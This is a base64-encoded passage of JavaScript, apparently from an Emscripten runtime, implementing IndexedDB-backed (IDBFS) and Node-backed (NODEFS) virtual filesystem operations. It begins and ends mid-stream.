U3RvcmUoSURCRlMuREJfU1RPUkVfTkFNRSkKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZpbGVTdG9yZSA9IGRiLmNyZWF0ZU9iamVjdFN0b3JlKElEQkZTLkRCX1NUT1JFX05BTUUpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoIWZpbGVTdG9yZS5pbmRleE5hbWVzLmNvbnRhaW5zKCJ0aW1lc3RhbXAiKSkgewogICAgICAgICAgICAgICAgZmlsZVN0b3JlLmNyZWF0ZUluZGV4KCJ0aW1lc3RhbXAiLCAidGltZXN0YW1wIiwge3VuaXF1ZTogZmFsc2V9KQogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgcmVxLm9uc3VjY2VzcyA9IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgZGIgPSByZXEucmVzdWx0OwogICAgICAgICAgICBJREJGUy5kYnNbbmFtZV0gPSBkYjsKICAgICAgICAgICAgY2FsbGJhY2sobnVsbCwgZGIpCiAgICAgICAgfSk7CiAgICAgICAgcmVxLm9uZXJyb3IgPSAoZnVuY3Rpb24oZSkgewogICAgICAgICAgICBjYWxsYmFjayh0aGlzLmVycm9yKTsKICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpCiAgICAgICAgfSkKICAgIH0pLCBnZXRMb2NhbFNldDogKGZ1bmN0aW9uKG1vdW50LCBjYWxsYmFjaykgewogICAgICAgIHZhciBlbnRyaWVzID0ge307CgogICAgICAgIGZ1bmN0aW9uIGlzUmVhbERpcihwKSB7CiAgICAgICAgICAgIHJldHVybiBwICE9PSAiLiIgJiYgcCAhPT0gIi4uIgogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gdG9BYnNvbHV0ZShyb290KSB7CiAgICAgICAgICAgIHJldHVybiAoZnVuY3Rpb24ocCkgewogICAgICAgICAgICAgICAgcmV0dXJuIFBBVEguam9pbjIocm9vdCwgcCkKICAgICAgICAgICAgfSkKICAgICAgICB9CgogICAgICAgIHZhciBjaGVjayA9IEZTLnJlYWRkaXIobW91bnQubW91bnRwb2ludCkuZmlsdGVyKGlzUmVhbERpcikubWFwKHRvQWJzb2x1dGUobW91bnQubW91bnRwb2ludCkpOwogICAgICAgIHdoaWxlKGNoZWNrLmxlbmd0aCkgewogICAgICAgICAgICB2YXIgcGF0aCA9IGNoZWNrLnBvcCgpOwogICAgICAgICAgICB2YXIgc3RhdDsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHN0YXQgPSBGUy5zdGF0KHBhdGgpCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgcmV0dXJuIGNhbGxiYWNrKGUpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoRlMuaXNEaXIoc3RhdC5tb2RlKSkgewogICAgICAgICAgICAgICAgY2hlY2sucHVzaC5hcHBseShjaGVjaywgRlMucmVhZGRpcihwYXRoKS5maWx0ZXIoaXNSZWFsRGlyKS5tYXAodG9BYnNvbHV0ZShwYXRoKSkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZW50cmllc1twYXRoXSA9IHt0aW1lc3RhbXA6IHN0YXQubXRpbWV9CiAgICAgICAgfQogICAgICAgIHJldHVybiBjYWxsYmFjayhudWxsLCB7dHlwZTogImxvY2FsIiwgZW50cmllczogZW50cmllc30pCiAgICB9KSwgZ2V0UmVtb3RlU2V0OiAoZnVuY3Rpb24obW91bnQsIGNhbGxiYWNrKSB7CiAgICAgICAgdmFyIGVudHJpZXMgPSB7fTsKICAgICAgICBJREJGUy5nZXREQihtb3VudC5tb3VudHBvaW50LCAoZnVuY3Rpb24oZXJyLCBkYikgewogICAgICAgICAgICBpZihlcnIpIHJldHVybiBjYWxsYmFjayhlcnIpOwogICAgICAgICAgICB2YXIgdHJhbnNhY3Rpb24gPSBkYi50cmFuc2FjdGlvbihbSURCRlMuREJfU1RPUkVfTkFNRV0sICJyZWFkb25seSIpOwogICAgICAgICAgICB0cmFuc2FjdGlvbi5vbmVycm9yID0gKGZ1bmN0aW9uKGUpIHsKICAgICAgICAgICAgICAgIGNhbGxiYWNrKHRoaXMuZXJyb3IpOwogICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICB2YXIgc3RvcmUgPSB0cmFuc2FjdGlvbi5vYmplY3RTdG9yZShJREJGUy5EQl9TVE9SRV9OQU1FKTsKICAgICAgICAgICAgdmFyIGluZGV4ID0gc3RvcmUuaW5kZXgoInRpbWVzdGFtcCIpOwogICAgICAgICAgICBpbmRleC5vcGVuS2V5Q3Vyc29yKCkub25zdWNjZXNzID0gKGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgICAgICAgICB2YXIgY3Vyc29yID0gZXZlbnQudGFyZ2V0LnJlc3VsdDsKICAgICAgICAgICAgICAgIGlmKCFjdXJzb3IpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gY2FsbGJhY2sobnVsbCwge3R5cGU6ICJyZW1vdGUiLCBkYjogZGIsIGVudHJpZXM6IGVudHJpZXN9KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZW50cmllc1tjdXJzb3IucHJpbWFyeUtleV0gPSB7dGltZXN0YW1wOiBjdXJzb3Iua2V5fTsKICAgICAgICAgICAgICAgIGN1cnNvci5jb250aW51ZSgpCiAgICAgICAgICAgIH0pCiAgICAgICAgfSkpCiAgICB9KSwgbG9hZExvY2FsRW50cnk6IChmdW5jdGlvbihwYXRoLCBjYWxsYmFjaykgewogICAgICAgIHZhciBzdGF0LCBub2RlOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgpOwogICAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGU7CiAgICAgICAgICAgIHN0YXQgPSBGUy5zdGF0KHBhdGgpCiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsYmFjayhlKQogICAgICAgIH0KICAgICAgICBpZihGUy5pc0RpcihzdGF0Lm1vZGUpKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsYmFjayhudWxsLCB7dGltZXN0YW1wOiBzdGF0Lm10aW1lLCBtb2RlOiBzdGF0Lm1vZGV9KQogICAgICAgIH0gZWxzZSBpZihGUy5pc0ZpbGUoc3RhdC5tb2RlKSkgewogICAgICAgICAgICBub2RlLmNvbnRlbnRzID0gTUVNRlMuZ2V0RmlsZURhdGFBc1R5cGVkQXJyYXkobm9kZSk7CiAgICAgICAgICAgIHJldHVybiBjYWxsYmFjayhudWxsLCB7dGltZXN0YW1wOiBzdGF0Lm10aW1lLCBtb2RlOiBzdGF0Lm1vZGUsIGNvbnRlbnRzOiBub2RlLmNvbnRlbnRzfSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gY2FsbGJhY2sobmV3IEVycm9yKCJub2RlIHR5cGUgbm90IHN1cHBvcnRlZCIpKQogICAgICAgIH0KICAgIH0pLCBzdG9yZUxvY2FsRW50cnk6IChmdW5jdGlvbihwYXRoLCBlbnRyeSwgY2FsbGJhY2spIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZihGUy5pc0RpcihlbnRyeS5tb2RlKSkgewogICAgICAgICAgICAgICAgRlMubWtkaXIocGF0aCwgZW50cnkubW9kZSkKICAgICAgICAgICAgfSBlbHNlIGlmKEZTLmlzRmlsZShlbnRyeS5tb2RlKSkgewogICAgICAgICAgICAgICAgRlMud3JpdGVGaWxlKHBhdGgsIGVudHJ5LmNvbnRlbnRzLCB7ZW5jb2Rpbmc6ICJiaW5hcnkiLCBjYW5Pd246IHRydWV9KQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0dXJuIGNhbGxiYWNrKG5ldyBFcnJvcigibm9kZSB0eXBlIG5vdCBzdXBwb3J0ZWQiKSkKICAgICAgICAgICAgfQogICAgICAgICAgICBGUy5jaG1vZChwYXRoLCBlbnRyeS5tb2RlKTsKICAgICAgICAgICAgRlMudXRpbWUocGF0aCwgZW50cnkudGltZXN0YW1wLCBlbnRyeS50aW1lc3RhbXApCiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsYmFjayhlKQogICAgICAgIH0KICAgICAgICBjYWxsYmFjayhudWxsKQogICAgfSksIHJlbW92ZUxvY2FsRW50cnk6IChmdW5jdGlvbihwYXRoLCBjYWxsYmFjaykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgpOwogICAgICAgICAgICB2YXIgc3RhdCA9IEZTLnN0YXQocGF0aCk7CiAgICAgICAgICAgIGlmKEZTLmlzRGlyKHN0YXQubW9kZSkpIHsKICAgICAgICAgICAgICAgIEZTLnJtZGlyKHBhdGgpCiAgICAgICAgICAgIH0gZWxzZSBpZihGUy5pc0ZpbGUoc3RhdC5tb2RlKSkgewogICAgICAgICAgICAgICAgRlMudW5saW5rKHBhdGgpCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgcmV0dXJuIGNhbGxiYWNrKGUpCiAgICAgICAgfQogICAgICAgIGNhbGxiYWNrKG51bGwpCiAgICB9KSwgbG9hZFJlbW90ZUVudHJ5OiAoZnVuY3Rpb24oc3RvcmUsIHBhdGgsIGNhbGxiYWNrKSB7CiAgICAgICAgdmFyIHJlcSA9IHN0b3JlLmdldChwYXRoKTsKICAgICAgICByZXEub25zdWNjZXNzID0gKGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgICAgIGNhbGxiYWNrKG51bGwsIGV2ZW50LnRhcmdldC5yZXN1bHQpCiAgICAgICAgfSk7CiAgICAgICAgcmVxLm9uZXJyb3IgPSAoZnVuY3Rpb24oZSkgewogICAgICAgICAgICBjYWxsYmFjayh0aGlzLmVycm9yKTsKICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpCiAgICAgICAgfSkKICAgIH0pLCBzdG9yZVJlbW90ZUVudHJ5OiAoZnVuY3Rpb24oc3RvcmUsIHBhdGgsIGVudHJ5LCBjYWxsYmFjaykgewogICAgICAgIHZhciByZXEgPSBzdG9yZS5wdXQoZW50cnksIHBhdGgpOwogICAgICAgIHJlcS5vbnN1Y2Nlc3MgPSAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIGNhbGxiYWNrKG51bGwpCiAgICAgICAgfSk7CiAgICAgICAgcmVxLm9uZXJyb3IgPSAoZnVuY3Rpb24oZSkgewogICAgICAgICAgICBjYWxsYmFjayh0aGlzLmVycm9yKTsKICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpCiAgICAgICAgfSkKICAgIH0pLCByZW1vdmVSZW1vdGVFbnRyeTogKGZ1bmN0aW9uKHN0b3JlLCBwYXRoLCBjYWxsYmFjaykgewogICAgICAgIHZhciByZXEgPSBzdG9yZS5kZWxldGUocGF0aCk7CiAgICAgICAgcmVxLm9uc3VjY2VzcyA9IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgY2FsbGJhY2sobnVsbCkKICAgICAgICB9KTsKICAgICAgICByZXEub25lcnJvciA9IChmdW5jdGlvbihlKSB7CiAgICAgICAgICAgIGNhbGxiYWNrKHRoaXMuZXJyb3IpOwogICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCkKICAgICAgICB9KQogICAgfSksIHJlY29uY2lsZTogKGZ1bmN0aW9uKHNyYywgZHN0LCBjYWxsYmFjaykgewogICAgICAgIHZhciB0b3RhbCA9IDA7CiAgICAgICAgdmFyIGNyZWF0ZSA9IFtdOwogICAgICAgIE9iamVjdC5rZXlzKHNyYy5lbnRyaWVzKS5mb3JFYWNoKChmdW5jdGlvbihrZXkpIHsKICAgICAgICAgICAgdmFyIGUgPSBzcmMuZW50cmllc1trZXldOwogICAgICAgICAgICB2YXIgZTIgPSBkc3QuZW50cmllc1trZXldOwogICAgICAgICAgICBpZighZTIgfHwgZS50aW1lc3RhbXAgPiBlMi50aW1lc3RhbXApIHsKICAgICAgICAgICAgICAgIGNyZWF0ZS5wdXNoKGtleSk7CiAgICAgICAgICAgICAgICB0b3RhbCsrCiAgICAgICAgICAgIH0KICAgICAgICB9KSk7CiAgICAgICAgdmFyIHJlbW92ZSA9IFtdOwogICAgICAgIE9iamVjdC5rZXlzKGRzdC5lbnRyaWVzKS5mb3JFYWNoKChmdW5jdGlvbihrZXkpIHsKICAgICAgICAgICAgdmFyIGUgPSBkc3QuZW50cmllc1trZXldOwogICAgICAgICAgICB2YXIgZTIgPSBzcmMuZW50cmllc1trZXldOwogICAgICAgICAgICBpZighZTIpIHsKICAgICAgICAgICAgICAgIHJlbW92ZS5wdXNoKGtleSk7CiAgICAgICAgICAgICAgICB0b3RhbCsrCiAgICAgICAgICAgIH0KICAgICAgICB9KSk7CiAgICAgICAgaWYoIXRvdGFsKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsYmFjayhudWxsKQogICAgICAgIH0KICAgICAgICB2YXIgY29tcGxldGVkID0gMDsKICAgICAgICB2YXIgZGIgPSBzcmMudHlwZSA9PT0gInJlbW90ZSIgPyBzcmMuZGIgOiBkc3QuZGI7CiAgICAgICAgdmFyIHRyYW5zYWN0aW9uID0gZGIudHJhbnNhY3Rpb24oW0lEQkZTLkRCX1NUT1JFX05BTUVdLCAicmVhZHdyaXRlIik7CiAgICAgICAgdmFyIHN0b3JlID0gdHJhbnNhY3Rpb24ub2JqZWN0U3RvcmUoSURCRlMuREJfU1RPUkVfTkFNRSk7CgogICAgICAgIGZ1bmN0aW9uIGRvbmUoZXJyKSB7CiAgICAgICAgICAgIGlmKGVycikgewogICAgICAgICAgICAgICAgaWYoIWRvbmUuZXJyb3JlZCkgewogICAgICAgICAgICAgICAgICAgIGRvbmUuZXJyb3JlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGNhbGxiYWNrKGVycikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCsrY29tcGxldGVkID49IHRvdGFsKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gY2FsbGJhY2sobnVsbCkKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgdHJhbnNhY3Rpb24ub25lcnJvciA9IChmdW5jdGlvbihlKSB7CiAgICAgICAgICAgIGRvbmUodGhpcy5lcnJvcik7CiAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKQogICAgICAgIH0pOwogICAgICAgIGNyZWF0ZS5zb3J0KCkuZm9yRWFjaCgoZnVuY3Rpb24ocGF0aCkgewogICAgICAgICAgICBpZihkc3QudHlwZSA9PT0gImxvY2FsIikgewogICAgICAgICAgICAgICAgSURCRlMubG9hZFJlbW90ZUVudHJ5KHN0b3JlLCBwYXRoLCAoZnVuY3Rpb24oZXJyLCBlbnRyeSkgewogICAgICAgICAgICAgICAgICAgIGlmKGVycikgcmV0dXJuIGRvbmUoZXJyKTsKICAgICAgICAgICAgICAgICAgICBJREJGUy5zdG9yZUxvY2FsRW50cnkocGF0aCwgZW50cnksIGRvbmUpCiAgICAgICAgICAgICAgICB9KSkKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIElEQkZTLmxvYWRMb2NhbEVudHJ5KHBhdGgsIChmdW5jdGlvbihlcnIsIGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgaWYoZXJyKSByZXR1cm4gZG9uZShlcnIpOwogICAgICAgICAgICAgICAgICAgIElEQkZTLnN0b3JlUmVtb3RlRW50cnkoc3RvcmUsIHBhdGgsIGVudHJ5LCBkb25lKQogICAgICAgICAgICAgICAgfSkpCiAgICAgICAgICAgIH0KICAgICAgICB9KSk7CiAgICAgICAgcmVtb3ZlLnNvcnQoKS5yZXZlcnNlKCkuZm9yRWFjaCgoZnVuY3Rpb24ocGF0aCkgewogICAgICAgICAgICBpZihkc3QudHlwZSA9PT0gImxvY2FsIikgewogICAgICAgICAgICAgICAgSURCRlMucmVtb3ZlTG9jYWxFbnRyeShwYXRoLCBkb25lKQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgSURCRlMucmVtb3ZlUmVtb3RlRW50cnkoc3RvcmUsIHBhdGgsIGRvbmUpCiAgICAgICAgICAgIH0KICAgICAgICB9KSkKICAgIH0pCn07CnZhciBOT0RFRlMgPSB7CiAgICBpc1dpbmRvd3M6IGZhbHNlLAogICAgc3RhdGljSW5pdDogKGZ1bmN0aW9uKCkgewogICAgICAgIE5PREVGUy5pc1dpbmRvd3MgPSAhIXByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vKQogICAgfSksCiAgICBtb3VudDogKGZ1bmN0aW9uKG1vdW50KSB7CiAgICAgICAgYXNzZXJ0KEVOVklST05NRU5UX0lTX05PREUpOwogICAgICAgIHJldHVybiBOT0RFRlMuY3JlYXRlTm9kZShudWxsLCAiLyIsIE5PREVGUy5nZXRNb2RlKG1vdW50Lm9wdHMucm9vdCksIDApCiAgICB9KSwKICAgIGNyZWF0ZU5vZGU6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUsIG1vZGUsIGRldikgewogICAgICAgIGlmKCFGUy5pc0Rpcihtb2RlKSAmJiAhRlMuaXNGaWxlKG1vZGUpICYmICFGUy5pc0xpbmsobW9kZSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKQogICAgICAgIH0KICAgICAgICB2YXIgbm9kZSA9IEZTLmNyZWF0ZU5vZGUocGFyZW50LCBuYW1lLCBtb2RlKTsKICAgICAgICBub2RlLm5vZGVfb3BzID0gTk9ERUZTLm5vZGVfb3BzOwogICAgICAgIG5vZGUuc3RyZWFtX29wcyA9IE5PREVGUy5zdHJlYW1fb3BzOwogICAgICAgIHJldHVybiBub2RlCiAgICB9KSwKICAgIGdldE1vZGU6IChmdW5jdGlvbihwYXRoKSB7CiAgICAgICAgdmFyIHN0YXQ7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgc3RhdCA9IGZzLmxzdGF0U3luYyhwYXRoKTsKICAgICAgICAgICAgaWYoTk9ERUZTLmlzV2luZG93cykgewogICAgICAgICAgICAgICAgc3RhdC5tb2RlID0gc3RhdC5tb2RlIHwgKHN0YXQubW9kZSAmIDE0NikgPj4gMQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIGlmKCFlLmNvZGUpIHRocm93IGU7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pCiAgICAgICAgfQogICAgICAgIHJldHVybiBzdGF0Lm1vZGUKICAgIH0pLAogICAgcmVhbFBhdGg6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgdmFyIHBhcnRzID0gW107CiAgICAgICAgd2hpbGUobm9kZS5wYXJlbnQgIT09IG5vZGUpIHsKICAgICAgICAgICAgcGFydHMucHVzaChub2RlLm5hbWUpOwogICAgICAgICAgICBub2RlID0gbm9kZS5wYXJlbnQKICAgICAgICB9CiAgICAgICAgcGFydHMucHVzaChub2RlLm1vdW50Lm9wdHMucm9vdCk7CiAgICAgICAgcGFydHMucmV2ZXJzZSgpOwogICAgICAgIHJldHVybiBQQVRILmpvaW4uYXBwbHkobnVsbCwgcGFydHMpCiAgICB9KSwKICAgIGZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nTWFwOiB7CiAgICAgICAgMDogInIiLAogICAgICAgIDE6ICJyKyIsCiAgICAgICAgMjogInIrIiwKICAgICAgICA2NDogInIiLAogICAgICAgIDY1OiAicisiLAogICAgICAgIDY2OiAicisiLAogICAgICAgIDEyOTogInJ4KyIsCiAgICAgICAgMTkzOiAicngrIiwKICAgICAgICA1MTQ6ICJ3KyIsCiAgICAgICAgNTc3OiAidyIsCiAgICAgICAgNTc4OiAidysiLAogICAgICAgIDcwNTogInd4IiwKICAgICAgICA3MDY6ICJ3eCsiLAogICAgICAgIDEwMjQ6ICJhIiwKICAgICAgICAxMDI1OiAiYSIsCiAgICAgICAgMTAyNjogImErIiwKICAgICAgICAxMDg5OiAiYSIsCiAgICAgICAgMTA5MDogImErIiwKICAgICAgICAxMTUzOiAiYXgiLAogICAgICAgIDExNTQ6ICJheCsiLAogICAgICAgIDEyMTc6ICJheCIsCiAgICAgICAgMTIxODogImF4KyIsCiAgICAgICAgNDA5NjogInJzIiwKICAgICAgICA0MDk4OiAicnMrIgogICAgfSwKICAgIGZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nOiAoZnVuY3Rpb24oZmxhZ3MpIHsKICAgICAgICBmbGFncyAmPSB+MjA5NzE1MjsKICAgICAgICBmbGFncyAmPSB+MjA0ODsKICAgICAgICBmbGFncyAmPSB+MzI3Njg7CiAgICAgICAgZmxhZ3MgJj0gfjUyNDI4ODsKICAgICAgICBpZihmbGFncyBpbiBOT0RFRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmdNYXApIHsKICAgICAgICAgICAgcmV0dXJuIE5PREVGUy5mbGFnc1RvUGVybWlzc2lvblN0cmluZ01hcFtmbGFnc10KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpCiAgICAgICAgfQogICAgfSksCiAgICBub2RlX29wczogewogICAgICAgIGdldGF0dHI6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgICAgIHZhciBwYXRoID0gTk9ERUZTLnJlYWxQYXRoKG5vZGUpOwogICAgICAgICAgICB2YXIgc3RhdDsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHN0YXQgPSBmcy5sc3RhdFN5bmMocGF0aCkKICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICBpZighZS5jb2RlKSB0aHJvdyBlOwogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSkKICAgICAgICAgICAgfQogICAgICAgICAgICBpZihOT0RFRlMuaXNXaW5kb3dzICYmICFzdGF0LmJsa3NpemUpIHsKICAgICAgICAgICAgICAgIHN0YXQuYmxrc2l6ZSA9IDQwOTYKICAgICAgICAgICAgfQogICAgICAgICAgICBpZihOT0RFRlMuaXNXaW5kb3dzICYmICFzdGF0LmJsb2NrcykgewogICAgICAgICAgICAgICAgc3RhdC5ibG9ja3MgPSAoc3RhdC5zaXplICsgc3RhdC5ibGtzaXplIC0gMSkgLyBzdGF0LmJsa3NpemUgfCAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgIGRldjogc3RhdC5kZXYsCiAgICAgICAgICAgICAgICBpbm86IHN0YXQuaW5vLAogICAgICAgICAgICAgICAgbW9kZTogc3RhdC5tb2RlLAogICAgICAgICAgICAgICAgbmxpbms6IHN0YXQubmxpbmssCiAgICAgICAgICAgICAgICB1aWQ6IHN0YXQudWlkLAogICAgICAgICAgICAgICAgZ2lkOiBzdGF0LmdpZCwKICAgICAgICAgICAgICAgIHJkZXY6IHN0YXQucmRldiwKICAgICAgICAgICAgICAgIHNpemU6IHN0YXQuc2l6ZSwKICAgICAgICAgICAgICAgIGF0aW1lOiBzdGF0LmF0aW1lLAogICAgICAgICAgICAgICAgbXRpbWU6IHN0YXQubXRpbWUsCiAgICAgICAgICAgICAgICBjdGltZTogc3RhdC5jdGltZSwKICAgICAgICAgICAgICAgIGJsa3NpemU6IHN0YXQuYmxrc2l6ZSwKICAgICAgICAgICAgICAgIGJsb2Nrczogc3RhdC5ibG9ja3MKICAgICAgICAgICAgfQogICAgICAgIH0pLCBzZXRhdHRyOiAoZnVuY3Rpb24obm9kZSwgYXR0cikgewogICAgICAgICAgICB2YXIgcGF0aCA9IE5PREVGUy5yZWFsUGF0aChub2RlKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmKGF0dHIubW9kZSAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICAgICAgZnMuY2htb2RTeW5jKHBhdGgsIGF0dHIubW9kZSk7CiAgICAgICAgICAgICAgICAgICAgbm9kZS5tb2RlID0gYXR0ci5tb2RlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZihhdHRyLnRpbWVzdGFtcCAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGRhdGUgPSBuZXcgRGF0ZShhdHRyLnRpbWVzdGFtcCk7CiAgICAgICAgICAgICAgICAgICAgZnMudXRpbWVzU3luYyhwYXRoLCBkYXRlLCBkYXRlKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYoYXR0ci5zaXplICE9PSB1bmRlZmluZWQpIHsKICAgICAgICAgICAgICAgICAgICBmcy50cnVuY2F0ZVN5bmMocGF0aCwgYXR0ci5zaXplKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgICAgIGlmKCFlLmNvZGUpIHRocm93IGU7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKQogICAgICAgICAgICB9CiAgICAgICAgfSksIGxvb2t1cDogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgewogICAgICAgICAgICB2YXIgcGF0aCA9IFBBVEguam9pbjIoTk9ERUZTLnJlYWxQYXRoKHBhcmVudCksIG5hbWUpOwogICAgICAgICAgICB2YXIgbW9kZSA9IE5PREVGUy5nZXRNb2RlKHBhdGgpOwogICAgICAgICAgICByZXR1cm4gTk9ERUZTLmNyZWF0ZU5vZGUocGFyZW50LCBuYW1lLCBtb2RlKQogICAgICAgIH0pLCBta25vZDogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSwgbW9kZSwgZGV2KSB7CiAgICAgICAgICAgIHZhciBub2RlID0gTk9ERUZTLmNyZWF0ZU5vZGUocGFyZW50LCBuYW1lLCBtb2RlLCBkZXYpOwogICAgICAgICAgICB2YXIgcGF0aCA9IE5PREVGUy5yZWFsUGF0aChub2RlKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmKEZTLmlzRGlyKG5vZGUubW9kZSkpIHsKICAgICAgICAgICAgICAgICAgICBmcy5ta2RpclN5bmMocGF0aCwgbm9kZS5tb2RlKQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBmcy53cml0ZUZpbGVTeW5jKHBhdGgsICIiLCB7bW9kZTogbm9kZS5tb2RlfSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICBpZighZS5jb2RlKSB0aHJvdyBlOwogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSkKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gbm9kZQogICAgICAgIH0pLCByZW5hbWU6IChmdW5jdGlvbihvbGROb2RlLCBuZXdEaXIsIG5ld05hbWUpIHsKICAgICAgICAgICAgdmFyIG9sZFBhdGggPSBOT0RFRlMucmVhbFBhdGgob2xkTm9kZSk7CiAgICAgICAgICAgIHZhciBuZXdQYXRoID0gUEFUSC5qb2luMihOT0RFRlMucmVhbFBhdGgobmV3RGlyKSwgbmV3TmFtZSk7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBmcy5yZW5hbWVTeW5jKG9sZFBhdGgsIG5ld1BhdGgpCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgaWYoIWUuY29kZSkgdGhyb3cgZTsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pCiAgICAgICAgICAgIH0KICAgICAgICB9KSwgdW5saW5rOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lKSB7CiAgICAgICAgICAgIHZhciBwYXRoID0gUEFUSC5qb2luMihOT0RFRlMucmVhbFBhdGgocGFyZW50KSwgbmFtZSk7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBmcy51bmxpbmtTeW5jKHBhdGgpCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgaWYoIWUuY29kZSkgdGhyb3cgZTsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pCiAgICAgICAgICAgIH0KICAgICAgICB9KSwgcm1kaXI6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUpIHsKICAgICAgICAgICAgdmFyIHBhdGggPSBQQVRILmpvaW4yKE5PREVGUy5yZWFsUGF0aChwYXJlbnQpLCBuYW1lKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGZzLnJtZGlyU3luYyhwYXRoKQogICAgICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgICAgIGlmKCFlLmNvZGUpIHRocm93IGU7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFU1tlLmNvZGVdKQogICAgICAgICAgI